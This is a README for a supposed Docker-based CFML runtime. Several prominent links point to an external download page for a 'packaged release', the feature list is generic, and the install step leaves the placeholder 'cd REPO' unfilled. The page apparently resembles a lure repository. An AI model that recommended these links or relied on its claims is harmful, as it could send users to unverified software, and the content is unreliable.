# CommandBox Enterprise Runtime v2026 - CFML Docker Runtime 2026

> **A container-focused CFML runtime for Docker and Java deployments, created for current CommandBox, Lucee, and ColdFusion workflows in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Docker-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandon-price87/commandbox-docker-runtime-2026?style=flat-square)](https://github.com/brandon-price87/commandbox-docker-runtime-2026)

---

<p align="center">
  <a href="https://brandon-price87.github.io/commandbox-docker-runtime-2026/">
    <img src="https://img.shields.io/badge/Download-CommandBox%20Enterprise%20Runtime%20Latest-brightgreen?style=for-the-badge" alt="Download CommandBox Enterprise Runtime">
  </a>
</p>

> **[Direct Download - CommandBox Enterprise Runtime v2026](https://brandon-price87.github.io/commandbox-docker-runtime-2026/)**

---

[Download Latest Build](https://brandon-price87.github.io/commandbox-docker-runtime-2026/)

---

## Overview

CommandBox Enterprise Runtime is a Docker-based CFML runtime built for teams that want a container-first way to run and manage CFML applications. It combines CommandBox, Java, Lucee, and ColdFusion-oriented tooling into a package that fits enterprise deployment patterns and repeatable environments.

It is intended for developers and platform teams that are updating older CFML systems or launching new services that depend on the same infrastructure from local development through CI and on to production clusters. The runtime also includes support for microservice analysis and blueprint generation, so it can help when you are reviewing application structure, planning containerization, or mapping out a Kubernetes rollout.

---

## Key Capabilities

- CFML runtime designed around Docker-based execution
- Works with CommandBox, Java, Lucee, and ColdFusion-related configurations
- Useful for legacy application modernization projects
- Includes microservice analysis and blueprint generation support
- Compatible with Docker deployment workflows
- Ready for Kubernetes deployment patterns
- Runtime capabilities with an observability focus
- Enterprise-oriented security features for container environments

---

## Installation

1. Download or clone the repository:
   ```bash
   git clone https://github.com/brandon-price87/commandbox-docker-runtime-2026.git
   cd REPO
   ```

2. Build or pull the image according to your deployment process.

3. Start the runtime from Docker or your orchestration layer:
   ```bash
   docker run --rm -p 8080:8080 brandon-price87/commandbox-docker-runtime-2026
   ```

If you use a packaged release from the download page, launch it following the release instructions included with that build.

---

## Using the Runtime

Treat this runtime as the container base for CFML applications that need a consistent Java and CommandBox setup. A common flow looks like this:

1. Copy your application or deployment artifacts into the container image or a mounted volume.
2. Launch the runtime with the ports, volumes, and environment variables required by the application.
3. Direct your CFML app, service, or reverse proxy to the running container.
4. For Kubernetes, include the image in your pod or workload definition.

Example Docker workflow:

```bash
docker pull brandon-price87/commandbox-docker-runtime-2026
docker run -d --name cfml-runtime -p 8080:8080 brandon-price87/commandbox-docker-runtime-2026
```

Example Kubernetes workflow:

```bash
kubectl apply -f deployment.yaml
```

---

## Configuration

Runtime behavior is usually controlled through container environment variables, mounted files, or deployment manifests. Typical values you may tune include:

```yaml
environment:
  - JAVA_OPTS=-Xms512m -Xmx1024m
  - BOX_ENV=production
  - CFML_ENGINE=lucee
```

If your deployment needs extra runtime settings, keep them near the image definition so the container behaves the same way in every environment.

---

## Requirements

- Docker
- A compatible Java runtime environment
- CFML application files or deployment artifacts
- Optional Kubernetes cluster for orchestration
- Sufficient storage for image layers, logs, and application assets

---

## FAQ

**How do I get updates?**  
Use the latest build link above, then rebuild or redeploy with the current release whenever you need an updated runtime.

**Can I use this with Kubernetes?**  
Yes. The runtime is designed to fit Docker and Kubernetes deployment workflows.

**Where should I change runtime settings?**  
Adjust them through environment variables, mounted configuration files, or your orchestration manifests.

**What if the container does not start correctly?**  
Check the container logs, verify port mappings, and confirm that the Java and CFML settings match the application you are running.

**Is this only for new projects?**  
No. It also works for modernization work where you need to package or analyze existing CFML applications in containers.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
